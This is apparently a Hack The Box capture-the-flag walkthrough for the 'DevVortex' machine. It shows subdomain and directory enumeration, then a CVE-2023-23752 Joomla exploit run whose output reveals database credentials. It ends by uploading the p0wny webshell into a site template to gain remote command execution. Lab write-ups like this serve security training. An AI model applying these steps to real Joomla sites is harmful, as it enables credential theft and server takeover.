DevVortex

# Enumeration

Check nmap-scan. 
Open Ports are 80 and 22 . Moreover port 80 redirects to http://devvortex.htb/

So let's add this one to hosts-file

```
echo '10.10.11.242 devvortex.htb' | sudo tee -a /etc/hosts
```

## Vhost discovery

```
gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 40 -k
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devvortex.htb
[+] Method:          GET
[+] Threads:         40
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/11/26 12:04:27 Starting gobuster in VHOST enumeration mode
===============================================================
Progress: 4989 / 4990 (99.98%)
Found: dev.devvortex.htb Status: 200 [Size: 23221]
===============================================================
2023/11/26 12:04:35 Finished
===============================================================
```

```
echo '10.10.11.242 dev.devvortex.htb' | sudo tee -a /etc/hosts
```

## Dir Discovery

```
gobuster dir -u http://dev.devvortex.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/11/26 14:55:59 Starting gobuster in directory enumeration mode

....
many 403
....
/administrator        (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/administrator/]
/api                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/api/]
/api/experiments      (Status: 406) [Size: 29]
/api/experiments/configurations (Status: 406) [Size: 29]
/cache                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/cache/]
/components           (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/components/]
/home                 (Status: 200) [Size: 23221]
/images               (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/images/]
/includes             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/includes/]
/index.php            (Status: 200) [Size: 23221]
/language             (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/language/]
/layouts              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/layouts/]
/libraries            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/libraries/]
/media                (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/media/]
/modules              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/modules/]
/plugins              (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/plugins/]
/robots.txt           (Status: 200) [Size: 764]
/templates            (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/templates/]
/tmp                  (Status: 301) [Size: 178] [--> http://dev.devvortex.htb/tmp/]

```

## Joomla Version detection

At http://dev.devvortex.htb/README.txt the Joomla Version 4.2 get revealed.

## Grab Login Creds

Joomla! information disclosure - CVE-2023-23752 exploit

```
git clone https://github.com/Acceis/exploit-CVE-2023-23752

cd exploit-CVE-2023-23752

 ruby exploit.rb http://dev.devvortex.htb                                                                            │
Users                                                                                                                 │
[649] lewis (lewis) - lewis@devvortex.htb - Super Users                                                               │
[650] logan paul (logan) - logan@devvortex.htb - Registered                                                           │
                                                                                                                      │
Site info                                                                                                             │
Site name: Development                                                                                                │
Editor: tinymce                                                                                                       │
Captcha: 0                                                                                                            │
Access: 1                                                                                                             │
Debug status: false                                                                                                   │
                                                                                                                      │
Database info                                                                                                         │
DB type: mysqli                                                                                                       │
DB host: localhost                                                                                                    │
DB user: lewis                                                                                                        │
DB password: P4ntherg0t1n5r3c0n##                                                                                     │
DB name: joomla                                                                                                       │
DB prefix: sd4fg_                                                                                                     │
DB encryption 0
```

## Edit Joomla templates

Edit the Error-Template under the following url:
```
http://dev.devvortex.htb/administrator/index.php?option=com_templates&view=template&id=223&file=L2Vycm9yLnBocA%3D%3D&isMedia=0
```

Or got to 'System' --> 'Site Templates' --> 'Cassiopeia Details and Files' --> 'error.php'

Replace the Content with the ponyshell or your prefered shell

```
https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
``` 

Using webshell at following url:
```
http://dev.devvortex.htb/templates/cassiopeia/error.php
```

